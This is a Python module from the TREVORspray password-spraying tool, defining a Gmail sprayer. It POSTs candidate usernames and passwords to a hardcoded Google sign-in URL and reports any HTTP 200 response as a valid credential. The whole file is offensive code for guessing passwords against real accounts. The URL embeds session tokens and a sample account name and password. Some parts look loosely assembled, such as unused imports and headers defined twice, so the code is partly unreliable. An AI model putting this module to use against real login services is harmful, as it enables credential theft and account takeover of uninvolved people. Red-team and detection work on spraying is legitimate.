import logging
from ..util import ntlmdecode
from .base import BaseSprayModule
from tldextract import tldextract
from requests_ntlm import HttpNtlmAuth

log = logging.getLogger("trevorspray.sprayers.gmail")

class SprayModule(BaseSprayModule):

    # HTTP method
    method = 'POST'
    # default target URL
    default_url = 'https://accounts.google.com/v3/signin/challenge/pwd?TL=AJvNCbar5qtMxhAinFsXoLOvo3TbrkISaStxTeN_9cechXj5g84zrkTLHnlTHDyk&checkConnection=youtube%3A273%3A0&checkedDomains=youtube&cid=1&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F%26emr%3D1%26ltmpl%3Ddefault%26ltmplcache%3D2%26osid%3D1%26passive%3Dtrue%26password%3Dmybadpassword%26rm%3Dfalse%26scc%3D1%26service%3Dmail%26ss%3D1%26username%3Dctechs123%40gmail.com%26ifkv%3DAeDOFXhmC-wYkGSUmBaMWvgQzNdNC51wRnAaEck5Gi69RLmNhzrap_DoW1DUZs-IVHPz-7fTOG0uuQ%2F&dsh=S-83148827%3A1690554033508855&emr=1&flowEntry=ServiceLogin&flowName=GlifWebSignIn&ifkv=AeDOFXg6jc-OZf1JMYxw3jh9jpb2f4x78eKUgEJpOVx291yiYcCwyA62jzhTxgnMUKLFqEBi3ZXHVw&ltmpl=default&osid=1&pstMsg=1&rm=false&scc=1&service=mail&ss=1'
    # body of request
    request_data = { 
		  "username": "{username}",
                  "password": "{password}",
}
    # HTTP headers
    headers = {}
    # HTTP cookies
    cookies = {}
    # Don't count nonexistent accounts as failed logons
    fail_nonexistent = False

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) ',
    }


    def check_response(self, response):
        '''
        returns (valid, exists, locked, msg)
        '''

        valid = False
        exists = None
        locked = None
        msg = 'application specific password required'

        if getattr(response, 'status_code', 0) == 200:
            valid = True
            exists = True
            msg = 'Valid cred'

        return (valid, exists, locked, msg)
